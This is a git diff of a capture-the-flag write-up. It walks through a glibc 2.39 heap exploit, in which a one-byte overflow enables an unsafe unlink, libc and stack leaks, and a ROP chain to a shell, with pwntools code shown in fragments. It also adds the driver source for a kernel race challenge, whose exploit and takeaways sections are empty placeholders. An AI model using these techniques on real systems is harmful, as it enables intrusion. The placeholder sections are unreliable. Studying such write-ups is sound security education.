@@ -21,7 +21,7 @@ Old trick
 
 ## Solution
 
-### Initial checks
+### Initial Checks
 
 There is provided binary `old_rs` , `libc.so.6` and `ld-2.39.so` files.
 
@@ -121,7 +121,7 @@ As you can see there is no Use after Free or Double free bugs type bugs, because
 But there is single byte overflow in the `edit_ticket` allowing us to overflow next chunk's size field. We will use this strong primitive to exploit our binary in the Exploitation part.
 
 Now we can write some wrapper python pwntools code to be able to easily communicate with the binary options:
-```
+```python
 from pwn import *
 
 def malloc(p, data):
@@ -149,50 +149,26 @@ context.terminal = ["tmux", "splitw", "-h"]
 
 p = gdb.debug([exe.path], '''continue''')
 
+# we insert our exploit modification starting here
+
 p.interactive()
 ```
-I created this template using the behaviour of the functions, as you can see create_ticket not become malloc() and cancel_ticket eventually becomed free() in our template, others did not changed in the context.
+I created this template using the behaviour of the functions, as you can see create_ticket become malloc() and cancel_ticket eventually become free() in our template, others did not changed in the context.
 
 Lets dive into Exploitation part and see what we can achieve with single byte overflow in this program.
 
 ### Exploitation Part 1
 
-Firstly lets check that bug exist dynamically, via executing the binary with our template and setup the overflow, it should overflow '1' chunk's size field:
-```
-from pwn import *
-
-def malloc(p, data):
-        p.sendlineafter(b'> ', b'1')
-        p.sendafter(b': ', data)
-
-def edit(p, index, data):
-        p.sendlineafter(b'> ', b'2')
-        p.sendlineafter(b': ', str(index).encode())
-        p.sendafter(b': ', data)
-
-def view(p, index):
-        p.sendlineafter(b'> ', b'3')
-        p.sendlineafter(b': ', str(index).encode())
-
-def free(p, index):
-        p.sendlineafter(b'> ', b'4')
-        p.sendlineafter(b': ', str(index).encode())
-
-exe = ELF('./old_rs')
-libc = exe.libc
-context.binary = exe
-context.gdb_binary = 'pwndbg'
-context.terminal = ["tmux", "splitw", "-h"]
-
-p = gdb.debug([exe.path], '''continue''')
-
+Firstly lets check that bug exist dynamically, via executing the binary with our template and add the overflow part, it should overflow '1' chunk's size field:
+```python
 malloc(p, b'abc') # 0
 malloc(p, b'def') # 1
 malloc(p, b'123') # 2
 
-edit(p, 0, b'A' * 0x418 + b'\xff') # overflow next chunk's size field
+payload = b''
+payload += b'A' * 0x418 + b'\xff'
 
-p.interactive()
+edit(p, 0, payload) # overflow next chunk's size field
 ```
 
 Execute it and we can inspect the heap in pwndbg:
@@ -216,11 +192,12 @@ It takes the Forward pointer (fd) of current chunk, replaces Backward pointer (b
 But there is a twist. Since our binary is linked in GLIBC 2.39, there is malloc integrity check introduced way before, which checks our unlinking process to mitigate such attacks or make it harder to exploit.
 
 The check looks like this:
-  ```
+  ```c
     assert(P->fd->bk == P);
-    assert(P->bk->fd == P)
+    assert(P->bk->fd == P);
   ```
 Meaning it assumes and verifies that our chunks fd's bk is pointing to us, and our chunks bk's fd is also pointing to us, mitigating the initial arbitrary write ability, but we still can use this technique in certain situations which requires some additions in binary or how the program deals with chunks.
+
 2. To check if previous chunk is freed, malloc checks prev_in_use flag of the current chunk it accessing to, if its 0 then previous chunk is freed and unlink() can be called on this chunks.
 
 To make believe for malloc that previous chunk is freed and to forge using unlink on our current chunk, we just need to somehow null the prev_in_use bit which is LSB bit of size field (ex. 0x421 = prev_in_use=1, 0x420=prev_in_use=0)
@@ -237,35 +214,8 @@ We can get use of that, since we know its address in runtime, we dont need any a
 
 Here is addition, we need also to put valid prev_size field of the chunk 2, because malloc checks the prev_size for corruption and gets the offset based on that, also we need to put -0x10 prev_size on it since we want to point the prev_size into our actual fake chunk, we need to substract the 0x10 from it and place while we overflow
 
-So far our exploit with additional comments can be written as this:
-```
-from pwn import *
-
-def malloc(p, data):
-        p.sendlineafter(b'> ', b'1')
-        p.sendafter(b': ', data)
-
-def edit(p, index, data):
-        p.sendlineafter(b'> ', b'2')
-        p.sendlineafter(b': ', str(index).encode())
-        p.sendafter(b': ', data)
-
-def view(p, index):
-        p.sendlineafter(b'> ', b'3')
-        p.sendlineafter(b': ', str(index).encode())
-
-def free(p, index):
-        p.sendlineafter(b'> ', b'4')
-        p.sendlineafter(b': ', str(index).encode())
-
-exe = ELF('./old_rs')
-libc = exe.libc
-context.binary = exe
-context.gdb_binary = 'pwndbg'
-context.terminal = ["tmux", "splitw", "-h"]
-
-p = gdb.debug([exe.path], '''continue''')
-
+Now I can add lines to exploit with additional comments as this, but now we change the payload and add free call:
+```python
 malloc(p, b'abc') # 1-st usage option, 0 chunk
 malloc(p, b'def') # 2-nd usage option, 1 chunk
 malloc(p, b'123') # 3-rd usage option, 2 chunk
@@ -286,8 +236,6 @@ payload += p8(fake_size) # overflowing chunk 1 to replace 0x421 to 0x420, and nu
 
 edit(p, 0, payload) # 4-th usage option
 free(p, 1) # 5-th usage option, 1 free usage, triggers unlink on chunk 0
-
-p.interactive()
 ```
 
 We can execute it and check the memory around global_array, it should replace first entry with itself - 0x18 (should be 0x404038):
@@ -300,7 +248,7 @@ And yes we successfully gained arbitrary write on the global_array and we can no
 Now we have Arbitrary write on any address we provide inside of the global_array, which we control by editing the ticket (now it points to itself in ticket number 0, we can edit ticket and by the first entry we put our global_array address again, to persist the arbitary write primitive).
 
 Since we dont have any addresses leaked (stack, libc) and only have binary addresses, thanks to No PIE, we need some kind of Arbitrary Read. And of course if we can replace pointers in the global_array, we eventually have Arbitrary Read also, because we can review ticket which will give data inside of the address. Using that we can get our libc leak just by classic reading the puts GOT, i will add this step to exploit script:
-```
+```python
 edit(p, 0, p64(0) * 3 + p64(0x404050) + p64(exe.got.puts)) # 6 usage option
 view(p, 1) # 7 usage option, leaking libc
 
@@ -313,7 +261,7 @@ print(f"Libc address: {hex(libc.address)}")
 ```
 
 Now we can leverage our Arbitrary Write in any form, there is no __free_hook or __malloc_hook's available since its GLIBC 2.39 and it not contains that, but we can do several RCE on this version of libc. I prefered to use ROP chain into the stack RIP. This requires stack leak, so lets get it by leaking libc environ symbol which contains stack addresses:
-```
+```python
 edit(p, 0, p64(0x404050) + p64(libc.sym.environ)) # 8 usage option
 view(p, 1) # 9 usage option
 
@@ -326,12 +274,12 @@ print(f"Stack: {hex(stack)}")
 ```
 
 Then we can calculate the offset until our RIP to start overwriting it and edit global_array to finalize our attack, it can be done via debugging, simply put breakpoint and inspect the stack nearly behind returning from the function, and compare with our stack leak:
-```
+```python
 edit(p, 0, p64(0x404050) + p64(stack + 24)) # 10 usage option
 ```
 
-And whats left is just perform ROP chain by simply doing pop rdi for binsh address and jumping to system (not forged to use ret_gadget, there will be movabs issue inside of system, which is stack allignment issue that can be solved via simply retting):
-```
+And whats left is just perform ROP chain by simply doing pop rdi for binsh address and jumping to system (we also needed to use ret_gadget, there will be movabs issue inside of system, which is stack allignment issue that can be solved via simply retting):
+```python
 pop_rdi_ret = libc.address + 0x000000000010f78b
 bin_sh_addr = next(libc.search(b'/bin/sh\x00'))
 ret_gadget = libc.address + 0x000000000002882f
@@ -353,7 +301,7 @@ After that we will have shell, and we can read the flag
 
 ## Full Exploit Script
 
-```
+```python
 from pwn import *
 
 def malloc(p, data):
@@ -459,9 +407,125 @@ TU TU TU TUTU
 
 ## Solution
 
+### Initial Checks
+
+There is provided `vmlinux` binary of kernel, and `bzImage` with `initramfs.cpio.gz` containing filesystem of the system, also there is source code of the driver and `run.sh` to run kernel image locally. So this is kernel pwn task.
+
+After extracting the initramfs using `cpio` utility we can see the files `init` `flag` and `maxmax_driver.ko` - which seems to be compiled driver file of the source code which we have in the file `maxmax_driver.c`
+
+Now we can read the source code of the kernel driver:
+![](driver_src.png)
+![](driver_src_2.png)
+
+```c
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/fs.h>
+#include <linux/uaccess.h>
+#include <linux/slab.h>
+#include <linux/miscdevice.h>
+#include <linux/delay.h>
+
+#define DEVICE_NAME "maxmax_driver"
+#define CMD_ALLOC 0xf1311
+#define CMD_WRITE 0xf1312
+
+struct maxmax_obj {
+    char *buffer;
+    size_t size;
+};
+
+static struct maxmax_obj *global_obj = NULL;
+
+static long device_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
+    struct maxmax_obj *obj = global_obj;
+
+    switch (cmd) {
+        case CMD_ALLOC: {
+            size_t size;
+            if (copy_from_user(&size, (void __user *)arg, sizeof(size)))
+                return -EFAULT;
+            if (size < 40) {
+                return -EINVAL;
+            }
+            printk(KERN_INFO "Allocating size: %zu\n", size);
+
+            if (obj->buffer) {
+                kfree(obj->buffer);
+            }
+
+            obj->buffer = kmalloc(size, GFP_KERNEL);
+            obj->size = size;
+
+            if (!obj->buffer) return -ENOMEM;
+            break;
+        }
+
+        case CMD_WRITE: {
+            char *kbuf = obj->buffer;
+
+            if (!kbuf) return -EINVAL;
+
+            msleep(200);
+
+            if (copy_from_user(kbuf, (void __user *)arg, 40))
+                return -EFAULT;
+            break;
+        }
+
+        default:
+            return -EINVAL;
+    }
+    return 0;
+}
+
+static struct file_operations fops = {
+    .unlocked_ioctl = device_ioctl,
+};
+
+static struct miscdevice misc_dev = {
+    .minor = MISC_DYNAMIC_MINOR,
+    .name = DEVICE_NAME,
+    .fops = &fops,
+};
+
+static int __init maxmax_init(void) {
+    global_obj = kmalloc(sizeof(struct maxmax_obj), GFP_KERNEL);
+    global_obj->buffer = NULL;
+    global_obj->size = 0;
+    return misc_register(&misc_dev);
+}
+
+static void __exit maxmax_exit(void) {
+    if (global_obj) {
+        kfree(global_obj->buffer);
+        kfree(global_obj);
+    }
+    misc_deregister(&misc_dev);
+}
+
+module_init(maxmax_init);
+module_exit(maxmax_exit);
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Aker");
+MODULE_DESCRIPTION("ITFEST 2025 by FR13NDS TEAM");
+```
+
+
 ## Flag
 
-`f13{}`
+`f13{tutututu_max_verstappen_f4st3st_it_was_easy_kernel_glhf_next_tasks}`
+
+## Full Exploit Script
+
+```c
+#inlcude <stdio.h>
+```
+
+## Key Takeaways
+- 1
 
 ## References
 
+- [TOCTOU in details](https://google.com)
